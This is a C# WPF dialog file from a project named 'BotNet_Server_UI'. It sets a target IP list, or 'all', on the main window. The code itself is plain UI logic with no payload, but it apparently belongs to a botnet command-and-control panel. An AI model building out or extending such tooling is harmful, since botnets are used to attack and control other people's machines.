using System.Windows;
using System.Windows.Input;

namespace BotNet_Server_UI
{
    /// <summary>
    /// Логика взаимодействия для IPSet.xaml
    /// </summary>
    public partial class IPSet : Window
    {
        public IPSet()
        {
            InitializeComponent();
        }

        private void OKButton_Click(object sender, RoutedEventArgs e)
        {
            if (ResponseTextBox.Text == "null")
            {
                ((MainWindow)Application.Current.Windows[0]).ipsall = false;
                ((MainWindow)Application.Current.Windows[0]).ips = null;
                ((MainWindow)Application.Current.Windows[0]).UnblockTextIp();
            }
            else if (ResponseTextBox.Text == "all")
            {
                ((MainWindow)Application.Current.Windows[0]).ipsall = true;
                ((MainWindow)Application.Current.Windows[0]).ips = null;
                ((MainWindow)Application.Current.Windows[0]).BlockTextIP();
            }
            else
            {
                ((MainWindow)Application.Current.Windows[0]).ipsall = false;
                ((MainWindow)Application.Current.Windows[0]).ips = ResponseTextBox.Text.Split(' ');
                ((MainWindow)Application.Current.Windows[0]).BlockTextIP();
            }

            Close();
        }

        private void Field_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                if (ResponseTextBox.Text == "null")
                {
                    ((MainWindow)Application.Current.Windows[0]).ipsall = false;
                    ((MainWindow)Application.Current.Windows[0]).ips = null;
                    ((MainWindow)Application.Current.Windows[0]).UnblockTextIp();
                }
                else if (ResponseTextBox.Text == "all")
                {
                    ((MainWindow)Application.Current.Windows[0]).ipsall = true;
                    ((MainWindow)Application.Current.Windows[0]).ips = null;
                    ((MainWindow)Application.Current.Windows[0]).BlockTextIP();
                }
                else
                {
                    ((MainWindow)Application.Current.Windows[0]).ipsall = false;
                    ((MainWindow)Application.Current.Windows[0]).ips = ResponseTextBox.Text.Split(' ');
                    ((MainWindow)Application.Current.Windows[0]).BlockTextIP();
                }

                Close();
            }
        }
    }
}
